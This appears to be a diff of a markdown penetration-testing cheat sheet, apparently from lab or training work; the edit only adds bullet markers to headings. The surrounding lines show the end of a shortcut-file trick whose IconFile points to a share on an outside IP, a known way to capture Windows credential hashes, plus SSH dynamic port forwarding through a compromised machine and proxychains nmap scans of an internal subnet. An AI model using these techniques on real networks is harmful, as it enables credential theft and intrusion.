@@ -101,9 +101,9 @@ IconFile=\\103.103.143.33\share\legit.ico
 Command=ToggleDesktop
 ```
 #### Pivoting, Tunneling, and Port Forwarding
- ##### Dynamic port forwarding
+ ##### * Dynamic port forwarding
  ```ssh -D 9050 alreadyCompromisedMachine@10.129.202.64```
- ##### edit /etc/proxychains.conf
+ ##### * edit /etc/proxychains.conf
  ```socks4 	127.0.0.1 9050
     proxychains nmap -v -sn 172.16.5.1-200
     proxychains nmap -v -Pn -sT 172.16.5.19
